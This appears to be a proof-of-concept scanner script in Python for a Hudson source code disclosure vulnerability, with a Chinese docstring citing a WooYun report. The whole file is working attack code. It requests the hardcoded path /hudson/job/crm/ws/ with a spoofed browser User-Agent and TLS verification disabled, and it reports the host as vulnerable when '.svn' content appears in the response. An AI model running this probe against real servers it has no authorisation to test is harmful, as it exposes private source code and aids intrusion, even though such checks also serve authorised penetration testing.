#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: hudson源代码泄露漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0103484
author: Lucifer
description: 一种新型的漏洞Hudson利用方式，不用破解密码，不用代码执行，直接查看任意代码。访问项目页面访问不到源代码,我们后面直接加入/ws/即可访问和下载所有代码。
'''
import sys
import warnings
import requests
def run(url):
        result = ['hudson源代码泄露漏洞', '', '']
        headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/hudson/job/crm/ws/"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r".svn" in req.text:
                result[2] = '存在'
                result[1]=vulnurl
            else:
                result[2] = '不存在'
        except:
            result[2] = '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
